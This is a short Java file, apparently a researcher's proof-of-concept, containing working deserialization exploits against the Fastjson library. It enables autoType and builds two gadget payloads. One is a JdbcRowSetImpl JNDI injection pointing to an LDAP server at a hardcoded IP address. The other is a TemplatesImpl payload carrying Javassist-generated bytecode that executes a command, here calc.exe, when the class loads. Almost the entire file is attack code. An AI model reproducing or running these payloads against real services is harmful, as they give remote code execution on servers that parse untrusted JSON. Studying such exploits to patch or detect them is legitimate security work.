package fastjsonexp;


import com.alibaba.fastjson.*;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.rowset.JdbcRowSetImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.*;
import com.alibaba.fastjson.parser.ParserConfig;
import java.io.IOException;

public class test42 {

    public static void main(String[] args) throws NotFoundException, CannotCompileException, IOException {

//        JdbcRowSetImpl();
        TemplatesImpl();
//        getByteCodes();
    }


    public static void JdbcRowSetImpl(){
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String s1 = "{\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\",\"dataSourceName\":\"ldap://139.9.134.169:1100/Evil\",\"autoCommit\":true}";
        JSON.parseObject(s1);
    }
    public static void TemplatesImpl() throws NotFoundException, CannotCompileException, IOException {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String s1 = String.format("{\"@type\":\"LLcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;;\",\"_bytecodes\":[\"%s\"],'_name':'exp','_tfactory':{ },\"_outputProperties\":{ }}", getByteCodes());
        JSON.parseObject(s1, Feature.SupportNonPublicField);
    }

    public static String getByteCodes() throws CannotCompileException, NotFoundException, IOException {
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass cc = pool.makeClass("Squirt1e");
        String cmd = "java.lang.Runtime.getRuntime().exec(\"calc.exe\");";
        cc.makeClassInitializer().insertBefore(cmd);
        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        cc.writeFile();
        byte[] classBytes = cc.toBytecode();
//        byte[][] targetByteCodes = new byte[][]{classBytes};
        String encoder = java.util.Base64.getEncoder().encodeToString(classBytes);
//        System.out.println(encoder);
        return encoder;
    }

}
